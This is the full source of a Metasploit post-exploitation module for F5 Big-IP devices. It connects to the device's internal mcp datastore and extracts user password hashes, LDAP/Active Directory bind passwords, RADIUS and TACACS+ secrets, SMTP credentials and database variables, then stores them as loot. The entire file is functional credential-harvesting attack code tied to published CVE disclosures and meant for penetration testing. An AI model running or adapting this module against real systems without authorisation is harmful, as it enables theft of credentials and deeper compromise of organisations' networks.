##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System
  include Msf::Post::Linux::F5Mcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'F5 Big-IP Gather Information from MCP Datastore',
        'Description' => %q{
          This module gathers various interesting pieces of data from F5's
          "mcp" datastore, which is accessed via /var/run/mcp using a
          proprietary protocol.

          Adapted from:  https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb
        },
        'License' => MSF_LICENSE,
        'Author' => ['Ron Bowes'],
        'Platform' => ['linux', 'unix'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'References' => [
          ['URL', 'https://github.com/rbowes-r7/refreshing-mcp-tool'], # Original PoC
          ['URL', 'https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/'],
          ['URL', 'https://support.f5.com/csp/article/K97843387'],
        ],
        'DisclosureDate' => '2022-11-16',
        'Targets' => [[ 'Auto', {} ]],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptBool.new('GATHER_HASHES', [true, 'Gather password hashes from mcp', true]),
        OptBool.new('GATHER_SERVICE_PASSWORDS', [true, 'Gather upstream passwords (ie, LDAP, AD, RADIUS, etc) from mcp', true]),
        OptBool.new('GATHER_DB_VARIABLES', [true, 'Gather database variables (warning: slow)', false]),
      ]
    )
  end

  def gather_hashes
    print_status('Gathering users and password hashes from mcp')
    users = mcp_simple_query('userdb_entry')

    unless users
      print_error('Failed to query users')
      return
    end

    loot = []
    users.each do |u|
      vprint_good("#{u['userdb_entry_name']} / #{u['userdb_entry_passwd']}")

      create_credential(
        jtr_format: Metasploit::Framework::Hashes.identify_hash(u['userdb_entry_passwd']),
        origin_type: :session,
        post_reference_name: refname,
        private_type: :nonreplayable_hash,
        private_data: u['userdb_entry_passwd'],
        session_id: session_db_id,
        username: u['userdb_entry_name'],
        workspace_id: myworkspace_id
      )
      loot << "#{u['userdb_entry_name']}:#{u['userdb_entry_passwd']}"
    end

    print_good("Users and password hashes stored in #{store_loot('f5.passwords', 'text/plain', session, loot.join("\n"), nil, 'F5 Password Hashes')}")
  end

  def gather_upstream_passwords
    results = []
    print_status('Gathering upstream passwords from mcp')

    vprint_status('Trying to fetch LDAP / Active Directory configuration')
    ldap_config = mcp_simple_query('auth_ldap_config')
    if ldap_config.empty?
      print_status('No LDAP / Active Directory password found')
    else
      ldap_config.each do |config|
        if config['auth_ldap_config_bind_pw']
          results << "LDAP: #{config['auth_ldap_config_bind_dn']} / #{config['auth_ldap_config_bind_pw']} (server(s): #{config['auth_ldap_config_servers'].join(', ')})"
        end
      end
    end

    vprint_status('Trying to fetch Radius configuration')
    radius_config = mcp_simple_query('radius_server')
    if radius_config.empty?
      print_status('No Radius password found')
    else
      radius_config.each do |config|
        if config['radius_server_secret']
          results << "Radius secret: #{config['radius_server_secret']} (server: #{config['radius_server_server']})"
        end
      end
    end

    vprint_status('Trying to fetch TACACS+ configuration')
    tacacs_config = mcp_simple_query('auth_tacacs_config')
    if tacacs_config.empty?
      print_status('No TACACS+ password found')
    else
      tacacs_config.each do |config|
        if config['auth_tacacs_config_secret']
          results << "TACACS+ secret: #{config['auth_tacacs_config_secret']} (server(s): #{config['auth_tacacs_config_servers'].join(', ')})"
        end
      end
    end

    vprint_status('Trying to fetch SMTP configuration')
    smtp_config = mcp_simple_query('smtp_config')
    if smtp_config.empty?
      print_status('No SMTP password found')
    else
      smtp_config.each do |config|
        if config['smtp_config_username']
          results << "SMTP account: #{config['smtp_config_username']} / #{config['smtp_config_password']} (server(s): #{config['smtp_config_smtp_server_address']}:#{config['smtp_config_smtp_server_port']})"
        end
      end
    end

    if results.empty?
      print_warning('No service passwords found')
    else
      if datastore['VERBOSE']
        results.each { |r| print_good(r) }
      end

      print_good("Passwords stored in #{store_loot('f5.service.passwords', 'text/plain', session, results.join("\n"), nil, 'F5 Service Passwords')}")
    end
  end

  def gather_db_variables
    print_status('Fetching db variables from mcp (this takes a bit)...')
    vars = mcp_simple_query('db_variable')

    unless vars
      print_error('Failed to query db variables')
      return
    end

    vars.each do |v|
      print_good "#{v['db_variable_name']} => #{v['db_variable_value']}"
    end
  end

  def run
    gather_hashes if datastore['GATHER_HASHES']
    gather_upstream_passwords if datastore['GATHER_SERVICE_PASSWORDS']
    gather_db_variables if datastore['GATHER_DB_VARIABLES']
  end
end
